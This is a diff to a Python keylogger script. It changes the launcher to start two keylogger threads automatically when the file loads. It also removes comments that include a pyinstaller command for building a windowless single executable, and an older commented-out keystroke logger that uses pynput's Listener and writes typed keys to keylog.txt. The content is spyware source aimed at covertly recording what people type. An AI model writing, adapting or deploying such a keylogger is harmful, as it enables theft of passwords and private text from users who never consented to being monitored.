@@ -61,59 +61,12 @@ def start():
     keylogger = Keylogger(interval=7, report_method="file")
     keylogger.start()
 
-def go():
-    Process(target=start, args=()).start()
-    Process(target=start, args=()).start()
+
+o = threading.Thread(target=start, args=())
+o.start()
+time.sleep(0.3)
+t = threading.Thread(target=start, args=())
+t.start()
 
 
 
-if __name__ == "__main__":
-    go()
-    # go()
-    # pip install pyinstaller keyboard
-    # pyinstaller --onefile -w -i "NONE" keylogger.py
-
-# Мой старый вариант
-
-# # pyinstaller --onefile -w -i "NONE" keylogger.py
-# with open('keylog.txt', 'w') as f:
-#     f.write("Start of recording\n")
-#
-#
-# def controller(key):
-#     file_log = f'keylog.txt'
-#     with open(file_log, 'r') as f:
-#         data = f.read()
-#
-#     letter = str(key)
-#     letter = letter.replace("'", "")
-#
-#     if letter == "Key.space":
-#         letter = " "
-#     if letter == "Key.shift":
-#         letter = ""
-#     if letter == "Key.backspace":
-#         data = data[:-1]
-#         letter = ""
-#     if letter == "Key.enter":
-#         letter = "\n"
-#
-#     data += letter
-#     with open(file_log, 'w') as f:
-#         f.write(data)
-#
-#     # print("WORK")
-#
-#
-# def start():
-#     with Listener(on_press=controller) as l:
-#         l.join()
-#
-#
-# def go():
-#     Process(target=start, args=()).start()
-#
-# if __name__ == '__main__':
-#     print("Hello from main Process")
-#     go()
-#     go()
